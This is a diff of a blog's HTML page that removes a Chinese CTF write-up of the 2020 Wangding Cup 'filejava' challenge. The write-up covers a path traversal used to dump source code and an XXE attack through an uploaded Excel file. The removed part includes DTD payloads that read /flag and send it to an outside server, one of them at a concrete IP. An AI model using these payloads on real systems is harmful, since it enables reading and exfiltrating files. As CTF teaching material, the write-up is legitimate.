@@ -18,7 +18,7 @@
   <meta name="author" content="KKfine&#39;s blog">
   <meta name="keywords" content="">
   
-  <title>java做题1 - KKfine&#39;s blog</title>
+  <title>KKfine&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -158,12 +158,12 @@
 </nav>
 
     <div class="banner" id="banner" parallax=true
-         style="background: url('/img/17.jpg') no-repeat center center;
+         style="background: url('/img/default.png') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="java做题1">
+            <span class="h2" id="subtitle" title="">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-11-06 22:06" pubdate>
-        2021年11月6日 晚上
+      <time datetime="2021-11-16 14:30" pubdate>
+        2021年11月16日 下午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      250 字
+      0 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      1
        分钟
     </span>
   
@@ -225,50 +225,15 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">java做题1</h1>
+            <h1 style="display: none"></h1>
             
             <div class="markdown-body">
-              <h1 id="网鼎杯-2020-filejava"><a href="#网鼎杯-2020-filejava" class="headerlink" title="网鼎杯 2020 filejava"></a>网鼎杯 2020 filejava</h1><p><a target="_blank" rel="noopener" href="https://www.4armed.co/blog/exploiting-xxe-with-excel/">https://www.4armed.co/blog/exploiting-xxe-with-excel/</a></p>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7747">https://xz.aliyun.com/t/7747</a></p>
-<p>下载文件处有filename目录穿越，结合报错可知道源码位置从而dump下源码开始审计</p>
-<p><img src="https://img-blog.csdnimg.cn/afd99418b023483389e6210ebb2497d1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/a2f5a947cd70454cb3c03923d962d22c.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>看到这里就很明显了，判断后缀名应该是xlsx，开头限制了为excel-，考的就是excel进行xxe攻击</p>
-<p>最开始使用得是这种打法</p>
-<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot; standalone&#x3D;&quot;yes&quot;?&gt;<br>&lt;!DOCTYPE ANY[<br>&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;vps:2122&#x2F;1.dtd&quot;&gt;<br>%remote;<br>%all;<br>]&gt;<br>&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;<br></code></pre></div></td></tr></table></figure>
-
-<p>1.dtd为</p>
-<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http:&#x2F;&#x2F;vps:2122&#x2F;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
-
-<p>感觉都行的，但是怎么打也打不通，后来换了一下，</p>
-<p><img src="https://img-blog.csdnimg.cn/5dc2c253ce9d42789fca303bd78f8296.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p>file.dtd中为</p>
-<figure class="highlight plain"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;<br>&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;39.107.239.30:3333?p&#x3D;%file;&#39;&gt;&quot;&gt;<br></code></pre></div></td></tr></table></figure>
-
-<p><img src="https://img-blog.csdnimg.cn/023f546407c845e48a269462caf19bde.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><img src="https://img-blog.csdnimg.cn/74b606bf5867403eae11993a981078cd.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<h1 id="网鼎杯ThinkJava"><a href="#网鼎杯ThinkJava" class="headerlink" title="网鼎杯ThinkJava"></a>网鼎杯ThinkJava</h1>
+              
             </div>
             <hr>
             <div>
               <div class="post-metas mb-3">
                 
-                  <div class="post-meta mr-3">
-                    <i class="iconfont icon-category"></i>
-                    
-                      <a class="hover-with-bg" href="/categories/java/">java</a>
-                    
-                  </div>
-                
-                
-                  <div class="post-meta">
-                    <i class="iconfont icon-tags"></i>
-                    
-                      <a class="hover-with-bg" href="/tags/web/">web</a>
-                    
-                      <a class="hover-with-bg" href="/tags/java/">java</a>
-                    
-                  </div>
                 
               </div>
               
@@ -283,18 +248,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/11/07/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">强网拟态</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/11/06/2021-10-java%E5%AE%A1%E8%AE%A11/">
-                        <span class="hidden-mobile">java审计1</span>
+                      <a href="/2021/11/07/2021-10-%E9%95%BF%E5%9F%8E%E6%9D%AF/">
+                        <span class="hidden-mobile">长城杯</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
